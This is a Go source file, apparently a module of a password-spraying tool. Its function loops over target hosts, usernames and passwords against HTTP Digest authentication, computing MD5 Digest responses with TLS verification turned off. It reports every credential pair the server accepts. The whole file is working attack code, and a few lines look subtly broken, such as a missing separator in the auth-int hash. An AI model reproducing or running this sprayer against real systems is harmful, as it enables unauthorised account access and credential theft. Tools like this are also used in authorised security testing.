package main

import (
	"crypto/md5"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"
)



func digestSpray(wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task, storeResult *int) {
	defer wg.Done()
	internalCounter := 0
	for _,taskTarget := range taskToRun.targetsRaw {
		temporaryTarget := parseTarget(taskTarget)
		taskToRun.target = temporaryTarget
		if taskToRun.target.port == 0 {
			taskToRun.target.port = 80
		}

		for _,password := range taskToRun.passwords {
			for _,username := range taskToRun.usernames {
				if internalCounter >= *storeResult {
					http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
					client := &http.Client{}
					req, _ := http.NewRequest("GET", taskToRun.target.scheme+"://"+taskToRun.target.host+":"+strconv.Itoa(taskToRun.target.port)+"/"+taskToRun.target.url, nil)
					req.Close = true
					res, requestError := client.Do(req)
					if requestError != nil {
						fmt.Println("HTTP Request failed. Target may be inaccessible or wrong taget format.",requestError)
					} else {
						if res.StatusCode == 401 {
							authHeader := res.Header.Get("Www-Authenticate")
							qop := ""
							algorithm := ""
							HA1 := ""
							HA2 := ""
							response := ""
							nonce := ""
							realm := ""
							entityBody := "" // Is needed for auth-int
							cnonce := StringWithCharset(16, charset)
							authHeader = strings.Replace(authHeader,"Digest ","",1)
							authHeaderSlice := strings.Split(authHeader, ",")
							for _, authHeaderItem := range authHeaderSlice {
								authHeaderItem = strings.Trim(authHeaderItem, " ")
								authHeaderItemSlice := strings.Split(authHeaderItem, "=")
								authHeaderItemName := authHeaderItemSlice[0]
								authHeaderItemValueSlice := authHeaderItemSlice[1:]
								authHeaderItemValue := strings.Join(authHeaderItemValueSlice, "=")
								authHeaderItemValue = strings.Trim(authHeaderItemValue, "\"")

								if authHeaderItemName == "qop" {
									qop = authHeaderItemValue
								} else if authHeaderItemName == "algorithm" {
									algorithm = authHeaderItemValue
								} else if authHeaderItemName == "nonce" {
									nonce = authHeaderItemValue
								} else if authHeaderItemName == "realm" {
									realm = authHeaderItemValue
								}
							}
							if algorithm == "MD5-sess" {
								hash := md5.Sum([]byte(username + ":" + realm + ":" + password))
								hash1 := hex.EncodeToString(hash[:])
								hash = md5.Sum([]byte(hash1 + ":" + nonce + ":" + cnonce))
								HA1 = hex.EncodeToString(hash[:])
							} else {
								hash := md5.Sum([]byte(username + ":" + realm + ":" + password))
								HA1 = hex.EncodeToString(hash[:])
							}
							if qop == "auth-int" {
								hash := md5.Sum([]byte(entityBody))
								hash1 := hex.EncodeToString(hash[:])
								hash = md5.Sum([]byte("GET:/" + taskToRun.target.url + hash1))
								HA2 = hex.EncodeToString(hash[:])
							} else {
								hash := md5.Sum([]byte("GET:/" + taskToRun.target.url))
								HA2 = hex.EncodeToString(hash[:])
							}

							if qop == "auth-int" || qop == "auth" {
								hash := md5.Sum([]byte(HA1 + ":" + nonce + ":00000001:" + cnonce + ":" + qop + ":" + HA2))
								response = hex.EncodeToString(hash[:])
							} else {
								hash := md5.Sum([]byte(HA1 + ":" + nonce + ":" + HA2))
								response = hex.EncodeToString(hash[:])
							}
							headerValue := "Digest username=\"" + username + "\", realm=\"" + realm + "\", nonce=\"" + nonce + "\", uri=\"" + "/" + taskToRun.target.url + "\", algorithm=" + algorithm + ", response=\"" + response + "\", qop=" + qop + ", nc=00000001, cnonce=\"" + cnonce + "\""

							client = &http.Client{}
							reqInner, _ := http.NewRequest("GET", taskToRun.target.scheme+"://"+taskToRun.target.host+":"+strconv.Itoa(taskToRun.target.port)+"/"+taskToRun.target.url, nil)
							reqInner.Close = true
							reqInner.Header.Set("Authorization", headerValue)
							resInner, _ := client.Do(reqInner)

							if resInner.StatusCode == 401 {
								fmt.Print("-")
							} else {
								fmt.Print("+")
								channelToCommunicate <- taskToRun.target.host + ":" + username + ":" + password
							}
							resInner.Body.Close()
						}
						res.Body.Close()
					}

					*storeResult++
				} else {
				}
				internalCounter++
			}
		}
	}
}


